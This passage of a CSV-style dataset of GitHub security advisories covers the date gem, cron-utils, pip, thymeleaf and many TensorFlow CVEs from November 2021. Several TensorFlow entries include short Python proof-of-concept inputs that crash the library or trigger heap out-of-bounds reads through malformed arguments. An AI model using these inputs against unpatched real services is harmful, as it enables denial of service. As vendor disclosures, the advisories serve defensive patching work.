* Email us at [security@solidus.io](mailto:security@soliidus.io)
* Contact the core team on [Slack](http://slack.solidus.io/)
",rubygems
1931,28422,date,GHSA-qg54-694p-wgpp,CVE-2021-41817,https://github.com/advisories/GHSA-qg54-694p-wgpp,high,2021-11-16 00:32:30 UTC,Regular expression denial of service vulnerability (ReDoS) in date,"Date’s parsing methods including Date.parse are using Regexps internally, some of which are vulnerable against regular expression denial of service. Applications and libraries that apply such methods to untrusted input may be affected.

The fix limits the input length up to 128 bytes by default instead of changing the regexps. This is because Date gem uses many Regexps and it is possible that there are still undiscovered vulnerable Regexps. For compatibility, it is allowed to remove the limitation by explicitly passing limit keywords as nil like Date.parse(str, limit: nil), but note that it may take a long time to parse.

Please update the date gem to version 3.2.1, 3.1.2, 3.0.2, and 2.0.1, or later. You can use gem update date to update it. If you are using bundler, please add gem ""date"", "">= 3.2.1"" to your Gemfile. If you import `date` from the standard library rather than as a gem you should update your Ruby install to `3.0.3`, `2.7.5`, `2.6.9` or later.

Users unable to upgrade may consider using `Date.strptime` instead with a predefined date format
```ruby
Date.strptime('2001-02-20', '%Y-%m-%d')
```",rubygems
1932,37646,com.cronutils:cron-utils,GHSA-p9m8-27x8-rg87,CVE-2021-41269,https://github.com/advisories/GHSA-p9m8-27x8-rg87,critical,2021-11-15 23:27:11 UTC,Critical vulnerability found in cron-utils,"### Impact
A Template Injection was identified in cron-utils enabling attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability. Versions up to 9.1.2 are susceptible to this vulnerability. Please note, that only projects using the @Cron annotation to validate untrusted Cron expressions are affected.

### Patches
The issue was patched and a new version was released. Please upgrade to version 9.1.6.

### Workarounds
There are no known workarounds up to this moment.

### References
A description of the issue is provided in [issue 461](https://github.com/jmrozanec/cron-utils/issues/461)

### For more information
If you have any questions or comments about this advisory:

Open an issue in the [cron-utils Github repository](https://github.com/jmrozanec/cron-utils)",maven
1933,19919,pip,GHSA-5xp3-jfq3-5q8x,CVE-2021-3572,https://github.com/advisories/GHSA-5xp3-jfq3-5q8x,moderate,2021-11-15 17:45:01 UTC,Improper Input Validation in pip,A flaw was found in python-pip in the way it handled Unicode separators in git references. A remote attacker could possibly use this issue to install a different revision on a repository. The highest threat from this vulnerability is to data integrity. This is fixed in python-pip version 21.1.,pip
1934,37771,org.thymeleaf:thymeleaf-spring5,GHSA-qcj6-jqrg-4wp2,CVE-2021-43466,https://github.com/advisories/GHSA-qcj6-jqrg-4wp2,critical,2021-11-10 19:52:33 UTC,Template injection in thymeleaf-spring5,"In the thymeleaf-spring5:3.0.12 component, thymeleaf combined with specific scenarios in template injection may lead to remote code execution.",maven
1935,20741,tensorflow,GHSA-cq76-mxrc-vchh,CVE-2021-41195,https://github.com/advisories/GHSA-cq76-mxrc-vchh,moderate,2021-11-10 19:36:50 UTC,Crash in `tf.math.segment_*` operations,"### Impact
The implementation of `tf.math.segment_*` operations results in a `CHECK`-fail related abort (and denial of service) if a segment id in `segment_ids` is large.

```python
import tensorflow as tf

tf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])
tf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])
tf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])    
tf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])
tf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])
```

This is similar to [CVE-2021-29584](https://github.com/tensorflow/tensorflow/blob/3a74f0307236fe206b046689c4d76f57c9b74eee/tensorflow/security/advisory/tfsa-2021-071.md) (and similar other reported vulnerabilities in TensorFlow, localized to specific APIs): the [implementation](https://github.com/tensorflow/tensorflow/blob/dae66e518c88de9c11718cd0f8f40a0b666a90a0/tensorflow/core/kernels/segment_reduction_ops_impl.h) (both on CPU and GPU) computes the output shape using [`AddDim`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L395-L408). However, if the number of elements in the tensor overflows an `int64_t` value, `AddDim` results in a `CHECK` failure which provokes a `std::abort`. Instead, code should use [`AddDimWithStatus`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L410-L440).


### Patches
We have patched the issue in GitHub commit [e9c81c1e1a9cd8dd31f4e83676cab61b60658429](https://github.com/tensorflow/tensorflow/commit/e9c81c1e1a9cd8dd31f4e83676cab61b60658429) (merging [#51733](https://github.com/tensorflow/tensorflow/pull/51733)).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.      

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.     

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46888).",pip
1936,20741,tensorflow,GHSA-m539-j985-hcr8,CVE-2021-41196,https://github.com/advisories/GHSA-m539-j985-hcr8,moderate,2021-11-10 19:36:21 UTC,Crash in `max_pool3d` when size argument is 0 or negative,"### Impact
The Keras pooling layers can trigger a segfault if the size of the pool is 0 or if a dimension is negative: 

```python
import tensorflow as tf

pool_size = [2, 2, 0]
layer = tf.keras.layers.MaxPooling3D(strides=1, pool_size=pool_size)
input_tensor = tf.random.uniform([3, 4, 10, 11, 12], dtype=tf.float32)
res = layer(input_tensor)
```

This is due to the TensorFlow's implementation of pooling operations where the values in the sliding window are not checked to be strictly positive.

### Patches
We have patched the issue in GitHub commit [12b1ff82b3f26ff8de17e58703231d5a02ef1b8b](https://github.com/tensorflow/tensorflow/commit/12b1ff82b3f26ff8de17e58703231d5a02ef1b8b) (merging [#51975](https://github.com/tensorflow/tensorflow/pull/51975)).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution 
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51936).
",pip
1937,20741,tensorflow,GHSA-prcg-wp5q-rv7p,CVE-2021-41197,https://github.com/advisories/GHSA-prcg-wp5q-rv7p,moderate,2021-11-10 19:35:35 UTC,Crashes due to overflow and `CHECK`-fail in ops with large tensor shapes,"### Impact
TensorFlow allows tensor to have a large number of dimensions and each dimension can be as large as desired. However, the total number of elements in a tensor must fit within an `int64_t`. If an overflow occurs, `MultiplyWithoutOverflow` would return a negative result. In the majority of TensorFlow codebase this then results in a `CHECK`-failure. Newer constructs exist which return a `Status` instead of crashing the binary.

For example [`AddDim`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L395-L408) calls should be replaced by [`AddDimWithStatus`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L410-L440).

This is similar to [CVE-2021-29584](https://github.com/tensorflow/tensorflow/blob/3a74f0307236fe206b046689c4d76f57c9b74eee/tensorflow/security/advisory/tfsa-2021-071.md) (and similar other reported vulnerabilities in TensorFlow, localized to specific APIs).

### Patches
We have patched the issue in GitHub commits [7c1692bd417eb4f9b33ead749a41166d6080af85](https://github.com/tensorflow/tensorflow/commit/7c1692bd417eb4f9b33ead749a41166d6080af85) (merging [#51732](https://github.com/tensorflow/tensorflow/pull/51732)), [d81b1351da3e8c884ff836b64458d94e4a157c15](https://github.com/tensorflow/tensorflow/commit/d81b1351da3e8c884ff836b64458d94e4a157c15) (merging [#51717](https://github.com/tensorflow/tensorflow/pull/51717)), [a871989d7b6c18cdebf2fb4f0e5c5b62fbc19edf](https://github.com/tensorflow/tensorflow/commit/a871989d7b6c18cdebf2fb4f0e5c5b62fbc19edf) (merging [#51658](https://github.com/tensorflow/tensorflow/pull/51658)), and [d81b1351da3e8c884ff836b64458d94e4a157c15](https://github.com/tensorflow/tensorflow/commit/d81b1351da3e8c884ff836b64458d94e4a157c15) (merging [#51973](https://github.com/tensorflow/tensorflow/pull/51973)). It is possible that other similar instances exist in TensorFlow, we will issue fixes as these are discovered.

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46890), [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51618) and [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51908).",pip
1938,20741,tensorflow,GHSA-2p25-55c9-h58q,CVE-2021-41198,https://github.com/advisories/GHSA-2p25-55c9-h58q,moderate,2021-11-10 19:33:58 UTC,Overflow/crash in `tf.tile` when tiling tensor is large,"### Impact
If `tf.tile` is called with a large input argument then the TensorFlow process will crash due to a `CHECK`-failure caused by an overflow.

```python
import tensorflow as tf
import numpy as np
tf.keras.backend.tile(x=np.ones((1,1,1)), n=[100000000,100000000, 100000000])
```

The number of elements in the output tensor is too much for the `int64_t` type and the overflow is detected via a `CHECK` statement. This aborts the process.

### Patches
We have patched the issue in GitHub commit [9294094df6fea79271778eb7e7ae1bad8b5ef98f](https://github.com/tensorflow/tensorflow/commit/9294094df6fea79271778eb7e7ae1bad8b5ef98f) (merging [#51138](https://github.com/tensorflow/tensorflow/pull/51138)).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46911).",pip
1939,20741,tensorflow,GHSA-5hx2-qx8j-qjqm,CVE-2021-41199,https://github.com/advisories/GHSA-5hx2-qx8j-qjqm,moderate,2021-11-10 19:33:24 UTC,Overflow/crash in `tf.image.resize` when size is large,"### Impact
If `tf.image.resize` is called with a large input argument then the TensorFlow process will crash due to a `CHECK`-failure caused by an overflow.

```python
import tensorflow as tf
import numpy as np

tf.keras.layers.UpSampling2D(
  size=1610637938,
  data_format='channels_first',
  interpolation='bilinear')(np.ones((5,1,1,1)))
```

The number of elements in the output tensor is too much for the `int64_t` type and the overflow is detected via a `CHECK` statement. This aborts the process.

### Patches
We have patched the issue in GitHub commit [e5272d4204ff5b46136a1ef1204fc00597e21837](https://github.com/tensorflow/tensorflow/commit/e5272d4204ff5b46136a1ef1204fc00597e21837) (merging [#51497](https://github.com/tensorflow/tensorflow/pull/51497)).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46914).",pip
1940,20741,tensorflow,GHSA-gh8h-7j2j-qv4f,CVE-2021-41200,https://github.com/advisories/GHSA-gh8h-7j2j-qv4f,moderate,2021-11-10 19:31:16 UTC,Incomplete validation in `tf.summary.create_file_writer`,"### Impact
If `tf.summary.create_file_writer` is called with non-scalar arguments code crashes due to a `CHECK`-fail.

```python
import tensorflow as tf
import numpy as np
tf.summary.create_file_writer(logdir='', flush_millis=np.ones((1,2)))
```

### Patches
We have patched the issue in GitHub commit [874bda09e6702cd50bac90b453b50bcc65b2769e](https://github.com/tensorflow/tensorflow/commit/874bda09e6702cd50bac90b453b50bcc65b2769e) (merging [#51715](https://github.com/tensorflow/tensorflow/pull/51715)).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46909).",pip
1941,20741,tensorflow,GHSA-j86v-p27c-73fm,CVE-2021-41201,https://github.com/advisories/GHSA-j86v-p27c-73fm,high,2021-11-10 19:17:43 UTC,Unitialized access in `EinsumHelper::ParseEquation`,"### Impact
During execution, [`EinsumHelper::ParseEquation()`](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/linalg/einsum_op_impl.h#L126-L181) is supposed to set the flags in `input_has_ellipsis` vector and `*output_has_ellipsis` boolean to indicate whether there is ellipsis in the corresponding inputs and output.

However, the code only changes these flags to `true` and never assigns `false`.

```cc
for (int i = 0; i < num_inputs; ++i) {
  input_label_counts->at(i).resize(num_labels);
  for (const int label : input_labels->at(i)) {
    if (label != kEllipsisLabel)
      input_label_counts->at(i)[label] += 1;
    else
      input_has_ellipsis->at(i) = true;
  }
}
output_label_counts->resize(num_labels);
for (const int label : *output_labels) {
  if (label != kEllipsisLabel)
    output_label_counts->at(label) += 1;
  else
    *output_has_ellipsis = true;
}
```

This results in unitialized variable access if callers assume that `EinsumHelper::ParseEquation()` always sets these flags.


### Patches
We have patched the issue in GitHub commit [f09caa532b6e1ac8d2aa61b7832c78c5b79300c6](https://github.com/tensorflow/tensorflow/commit/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
1942,20741,tensorflow,GHSA-xrqm-fpgr-6hhx,CVE-2021-41202,https://github.com/advisories/GHSA-xrqm-fpgr-6hhx,moderate,2021-11-10 19:13:16 UTC,Overflow/crash in `tf.range`,"### Impact
While calculating the size of the output within the `tf.range` kernel, there is a conditional statement of type `int64 = condition ? int64 : double`. Due to C++ implicit conversion rules, both branches of the condition will be cast to `double` and the result would be truncated before the assignment. This result in overflows:

```python
import tensorflow as tf

tf.sparse.eye(num_rows=9223372036854775807, num_columns=None)
```
  
Similarly, `tf.range` would result in crashes due to overflows if the start or end point are too large.

```python
import tensorflow as tf

tf.range(start=-1e+38, limit=1)
```

### Patches
We have patched the issue in GitHub commits [6d94002a09711d297dbba90390d5482b76113899](https://github.com/tensorflow/tensorflow/commit/6d94002a09711d297dbba90390d5482b76113899) (merging [#51359](https://github.com/tensorflow/tensorflow/pull/51359)) and [1b0e0ec27e7895b9985076eab32445026ae5ca94](https://github.com/tensorflow/tensorflow/commit/1b0e0ec27e7895b9985076eab32445026ae5ca94) (merging [#51711](https://github.com/tensorflow/tensorflow/pull/51711)).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46912), [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46899) and [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46889).
",pip
1943,20741,tensorflow,GHSA-7pxj-m4jf-r6h2,CVE-2021-41203,https://github.com/advisories/GHSA-7pxj-m4jf-r6h2,high,2021-11-10 19:12:46 UTC,Missing validation during checkpoint loading,"### Impact
An attacker can trigger undefined behavior, integer overflows, segfaults and `CHECK`-fail crashes if they can change saved checkpoints from outside of TensorFlow.

This is because the checkpoints loading infrastructure is missing validation for invalid file formats.

### Patches
We have patched the issue in GitHub commits [b619c6f865715ca3b15ef1842b5b95edbaa710ad](https://github.com/tensorflow/tensorflow/commit/b619c6f865715ca3b15ef1842b5b95edbaa710ad), [e8dc63704c88007ee4713076605c90188d66f3d2](https://github.com/tensorflow/tensorflow/commit/e8dc63704c88007ee4713076605c90188d66f3d2), [368af875869a204b4ac552b9ddda59f6a46a56ec](https://github.com/tensorflow/tensorflow/commit/368af875869a204b4ac552b9ddda59f6a46a56ec), and [abcced051cb1bd8fb05046ac3b6023a7ebcc4578](https://github.com/tensorflow/tensorflow/commit/abcced051cb1bd8fb05046ac3b6023a7ebcc4578).

These fixes will be included in TensorFlow 2.7.0. We will also cherrypick these commits on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
1944,20741,tensorflow,GHSA-786j-5qwq-r36x,CVE-2021-41204,https://github.com/advisories/GHSA-786j-5qwq-r36x,moderate,2021-11-10 19:12:14 UTC,Segfault while copying constant resource tensor,"### Impact
During TensorFlow's Grappler optimizer phase, constant folding might attempt to deep copy a resource tensor. This results in a segfault, as these tensors are supposed to not change.

### Patches
We have patched the issue in GitHub commit [7731e8dfbe4a56773be5dc94d631611211156659](https://github.com/tensorflow/tensorflow/commit/7731e8dfbe4a56773be5dc94d631611211156659).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.
    
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions",pip
1945,20741,tensorflow,GHSA-49rx-x2rw-pc6f,CVE-2021-41205,https://github.com/advisories/GHSA-49rx-x2rw-pc6f,high,2021-11-10 19:04:25 UTC,Heap OOB read in all `tf.raw_ops.QuantizeAndDequantizeV*` ops,"### Impact
The [shape inference functions for the `QuantizeAndDequantizeV*` operations](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc) can trigger a read outside of bounds of heap allocated array as illustrated in the following sets of PoCs:

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV4Grad(
    gradients=[1.0,1.0],
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    axis=-100)
  return data

test()
```

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV4(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100)
  return data

test()
```

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV3(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    narrow_range=False,
    axis=-100)
  return data

test()
```

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV2(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100)
  return data

test()
```

In all of these cases, `axis` is a negative value different than the special value used for optional/unknown dimensions (i.e., -1). However, the code ignores the occurences of these values:

```cc
...
if (axis != -1) {
  ...
  c->Dim(input, axis);
  ...
}
```

### Patches
We have patched the issue in GitHub commit [7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d](https://github.com/tensorflow/tensorflow/commit/7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.
",pip
1946,20741,tensorflow,GHSA-pgcq-h79j-2f69,CVE-2021-41206,https://github.com/advisories/GHSA-pgcq-h79j-2f69,high,2021-11-10 19:03:38 UTC,Incomplete validation of shapes in multiple TF ops,"### Impact
Several TensorFlow operations are missing validation for the shapes of the tensor arguments involved in the call. Depending on the API, this can result in undefined behavior and segfault or `CHECK`-fail related crashes but in some scenarios writes and reads from heap populated arrays are also possible.

We have discovered these issues internally via tooling while working on improving/testing GPU op determinism. As such, we don't have reproducers and there will be multiple fixes for these issues.

### Patches
We have patched the issue in GitHub commits [68422b215e618df5ad375bcdc6d2052e9fd3080a](https://github.com/tensorflow/tensorflow/commit/68422b215e618df5ad375bcdc6d2052e9fd3080a), [4d74d8a00b07441cba090a02e0dd9ed385145bf4](https://github.com/tensorflow/tensorflow/commit/4d74d8a00b07441cba090a02e0dd9ed385145bf4), [579261dcd446385831fe4f7457d802a59685121d](https://github.com/tensorflow/tensorflow/commit/579261dcd446385831fe4f7457d802a59685121d), [da4aad5946be30e5f049920fa076e1f7ef021261](https://github.com/tensorflow/tensorflow/commit/da4aad5946be30e5f049920fa076e1f7ef021261), [4dddb2fd0b01cdd196101afbba6518658a2c9e07](https://github.com/tensorflow/tensorflow/commit/4dddb2fd0b01cdd196101afbba6518658a2c9e07), and [e7f497570abb6b4ae5af4970620cd880e4c0c904](https://github.com/tensorflow/tensorflow/commit/e7f497570abb6b4ae5af4970620cd880e4c0c904).

These fixes will be included in TensorFlow 2.7.0. We will also cherrypick these commits on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
1947,20741,tensorflow,GHSA-7v94-64hj-m82h,CVE-2021-41207,https://github.com/advisories/GHSA-7v94-64hj-m82h,moderate,2021-11-10 19:02:57 UTC,FPE in `ParallelConcat`,"### Impact
The [implementation of `ParallelConcat`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97) misses some input validation and can produce a division by 0:

```python
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)
  return y

test()
```

### Patches
We have patched the issue in GitHub commit [f2c3931113eaafe9ef558faaddd48e00a6606235](https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1948,20741,tensorflow,GHSA-57wx-m983-2f88,CVE-2021-41208,https://github.com/advisories/GHSA-57wx-m983-2f88,critical,2021-11-10 19:37:56 UTC,Incomplete validation in boosted trees code,"### Impact
The [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. As a result, attackers can trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures) as well as abuse undefined behavior (binding references to `nullptr`s). An attacker can also read and write from heap buffers, depending on the API that gets used and the arguments that are passed to the call.

**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. We will deprecate TensorFlow's boosted trees APIs in subsequent releases.

### Patches
We have patched the issue in GitHub commit [5c8c9a8bfe750f9743d0c859bae112060b216f5c](https://github.com/tensorflow/tensorflow/commit/5c8c9a8bfe750f9743d0c859bae112060b216f5c).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1949,20741,tensorflow,GHSA-6hpv-v2rx-c5g6,CVE-2021-41209,https://github.com/advisories/GHSA-6hpv-v2rx-c5g6,moderate,2021-11-10 19:02:17 UTC,FPE in convolutions with zero size filters,"### Impact
The [implementations for convolution operators](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/conv_ops.cc) trigger a division by 0 if passed empty filter tensor arguments.

### Patches
We have patched the issue in GitHub commit [f2c3931113eaafe9ef558faaddd48e00a6606235](https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235).
  
The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1950,20741,tensorflow,GHSA-m342-ff57-4jcc,CVE-2021-41210,https://github.com/advisories/GHSA-m342-ff57-4jcc,high,2021-11-10 19:01:44 UTC,Heap OOB read in `tf.raw_ops.SparseCountSparseOutput`,"### Impact
The [shape inference functions for `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/ops/count_ops.cc#L43-L50) can trigger a read outside of bounds of heap allocated array:

```python
import tensorflow as tf

@tf.function
def func():
  return tf.raw_ops.SparseCountSparseOutput(
    indices=[1],
    values=[[1]],
    dense_shape=[10],
    weights=[],
    binary_output= True)

func()
```

The function fails to check that the first input (i.e., `indices`) has rank 2:

```cc
  auto rank = c->Dim(c->input(0), 1);
```

### Patches
We have patched the issue in GitHub commit [701cfaca222a82afbeeb17496bd718baa65a67d2](https://github.com/tensorflow/tensorflow/commit/701cfaca222a82afbeeb17496bd718baa65a67d2).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1951,20741,tensorflow,GHSA-cvgx-3v3q-m36c,CVE-2021-41211,https://github.com/advisories/GHSA-cvgx-3v3q-m36c,high,2021-11-10 19:01:03 UTC,Heap OOB in shape inference for `QuantizeV2`,"### Impact
The [shape inference code for `QuantizeV2`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/framework/common_shape_fns.cc#L2509-L2530) can trigger a read outside of bounds of heap allocated array:

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeV2(
    input=[1.0,1.0],
    min_range=[1.0,10.0],
    max_range=[1.0,10.0],
    T=tf.qint32,
    mode='MIN_COMBINED',
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100,
    ensure_minimum_range=10)
  return data

test()
```

This occurs whenever `axis` is a negative value less than `-1`. In this case, we are accessing data before the start of a heap buffer:
    
```cc
int axis = -1;
Status s = c->GetAttr(""axis"", &axis);
if (!s.ok() && s.code() != error::NOT_FOUND) {
  return s;
}   
... 
if (axis != -1) {
  ...
  TF_RETURN_IF_ERROR(
      c->Merge(c->Dim(minmax, 0), c->Dim(input, axis), &depth));
}
```

The code allows `axis` to be an optional argument (`s` would contain an `error::NOT_FOUND` error code). Otherwise, it assumes that `axis` is a valid index into the dimensions of the `input` tensor. If `axis` is less than `-1` then this results in a heap OOB read.
    
### Patches
We have patched the issue in GitHub commit [a0d64445116c43cf46a5666bd4eee28e7a82f244](https://github.com/tensorflow/tensorflow/commit/a0d64445116c43cf46a5666bd4eee28e7a82f244).
    
The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, as this version is the only one that is also affected.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1952,20741,tensorflow,GHSA-fr77-rrx3-cp7g,CVE-2021-41212,https://github.com/advisories/GHSA-fr77-rrx3-cp7g,high,2021-11-10 19:00:31 UTC,Heap OOB read in `tf.ragged.cross`,"### Impact
The [shape inference code for `tf.ragged.cross`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/ragged_array_ops.cc#L64) can trigger a read outside of bounds of heap allocated array:

